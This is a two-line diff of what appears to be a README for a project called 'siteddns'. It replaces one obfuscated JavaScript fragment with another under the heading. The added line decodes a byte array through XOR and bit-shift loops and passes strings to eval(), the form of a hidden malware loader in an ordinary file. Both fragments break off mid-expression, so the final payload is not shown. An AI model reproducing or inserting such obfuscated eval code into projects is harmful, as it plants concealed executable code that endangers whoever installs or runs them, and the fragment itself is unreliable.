@@ -1,2 +1,2 @@
  # siteddns
-=3;){ly[ny]=(ly[ny]+ly[53])&0xff;ly[ny]=(ly[ny]+193)&0xff;ly[ny]=(-ly[ny])&0xff;ny--;}ny="ny=53;do{if(ny
+=2);kc="kc=3;do{if(kc>49)break;ic[kc]=((ic[kc]+ic[kc+1])&0xff)^217;kc++;}while(true);";eval(kc);kc="kc=2;do{ic[kc]=((((ic[kc]>>7)|((ic[kc]
